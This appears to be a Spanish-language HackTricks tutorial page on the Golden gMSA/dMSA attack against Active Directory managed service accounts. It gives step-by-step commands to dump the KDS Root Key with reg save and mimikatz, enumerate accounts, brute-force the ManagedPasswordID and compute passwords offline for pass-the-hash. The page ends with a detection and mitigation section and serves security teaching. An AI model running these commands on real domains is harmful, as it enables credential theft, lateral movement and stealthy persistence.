# Golden gMSA/dMSA Attack (Derivación offline de contraseñas de Managed Service Accounts)

{{#include ../../banners/hacktricks-training.md}}

## Descripción general

Windows Managed Service Accounts (MSA) son principals especiales diseñados para ejecutar servicios sin necesidad de gestionar manualmente sus contraseñas.
Existen dos variantes principales:

1. **gMSA** – group Managed Service Account – puede utilizarse en múltiples hosts autorizados en su atributo `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – el sucesor (en preview) de gMSA, que utiliza la misma criptografía, pero permite escenarios de delegación más granulares.

En ambas variantes, la **contraseña no se almacena** en cada Domain Controller (DC) como un NT-hash normal. En su lugar, cada DC puede **derivar** la contraseña actual sobre la marcha a partir de:

* La **KDS Root Key** de todo el forest (`KRBTGT\KDS`) – secreto con nombre basado en un GUID generado aleatoriamente, replicado en cada DC bajo el contenedor `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* El **SID** de la cuenta objetivo.
* Un **ManagedPasswordID** (GUID) específico de la cuenta, encontrado en el atributo `msDS-ManagedPasswordId`.

La derivación es: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob de 240 bytes que finalmente se **codifica en base64** y se almacena en el atributo `msDS-ManagedPassword`.
Durante el uso normal de la contraseña no se requiere tráfico Kerberos ni interacción con el domain – un host miembro deriva la contraseña localmente siempre que conozca las tres entradas.

## Golden gMSA / Golden dMSA Attack

Si un atacante puede obtener las tres entradas **offline**, puede calcular las **contraseñas actuales y futuras válidas** de **cualquier gMSA/dMSA del forest** sin volver a interactuar con el DC, evitando:<sup>[[1]](#references)[[2]](#references)</sup>

* La auditoría de lecturas LDAP
* Los intervalos de cambio de contraseña (puede precomputarlas)

Esto es análogo a un *Golden Ticket* para cuentas de servicio.<sup>[[1]](#references)[[2]](#references)</sup>

### Requisitos previos

1. **Compromise a nivel de forest** de **un DC** (o Enterprise Admin), o acceso `SYSTEM` a uno de los DC del forest.
2. Capacidad para enumerar cuentas de servicio (lectura LDAP / RID brute-force).
3. Workstation x64 con .NET ≥ 4.7.2 para ejecutar [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) o código equivalente.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Fase 1 – Extraer la KDS Root Key

Haz dump desde cualquier DC (Volume Shadow Copy / hives SAM+SECURITY sin procesar o secrets remotos):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
La cadena base64 etiquetada como `RootKey` (nombre GUID) es necesaria en pasos posteriores.<sup>[[1]](#references)[[2]](#references)</sup>

##### Fase 2 – Enumerar objetos gMSA / dMSA

Recupera al menos `sAMAccountName`, `objectSid` y `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementa modos auxiliares:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Fase 3 – Guess / Discover el ManagedPasswordID (cuando falta)

Algunas implementaciones *eliminan* `msDS-ManagedPasswordId` de las lecturas protegidas por ACL.
Como el GUID tiene 128 bits, un bruteforce ingenuo es inviable, pero:

1. Los primeros **32 bits = tiempo de Unix epoch** de la creación de la cuenta (resolución de minutos).
2. Le siguen 96 bits aleatorios.

Por lo tanto, una **wordlist reducida por cuenta** (± unas pocas horas) es realista.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
La herramienta calcula contraseñas candidatas y compara su blob base64 con el atributo `msDS-ManagedPassword` real; la coincidencia revela el GUID correcto.

##### Fase 4 – Cálculo y conversión offline de la contraseña

Una vez conocido el ManagedPasswordID, la contraseña válida está a un comando de distancia:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Los hashes resultantes pueden inyectarse con **mimikatz** (`sekurlsa::pth`) o **Rubeus** para abusar de Kerberos, lo que permite un **movimiento lateral** y una **persistencia** sigilosos.

## Detección y mitigación

* Restringir las capacidades de **backup del DC y lectura de registry hives** a los administradores de Tier-0.
* Monitorizar la creación de **Directory Services Restore Mode (DSRM)** o **Volume Shadow Copy** en los DC.
* Auditar las lecturas y los cambios en `CN=Master Root Keys,…` y en los flags de `userAccountControl` de las cuentas de servicio.
* Detectar **writes de contraseñas en base64** inusuales o la reutilización repentina de contraseñas de servicio entre hosts.
* Considerar convertir las gMSAs con privilegios elevados en **classic service accounts** con rotaciones aleatorias periódicas cuando no sea posible el aislamiento de Tier-0.

## Herramientas

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementación de referencia utilizada en esta página.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implementación de referencia utilizada en esta página.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket mediante claves AES derivadas.

## Referencias

- [1] [Golden dMSA – bypass de autenticación para Delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
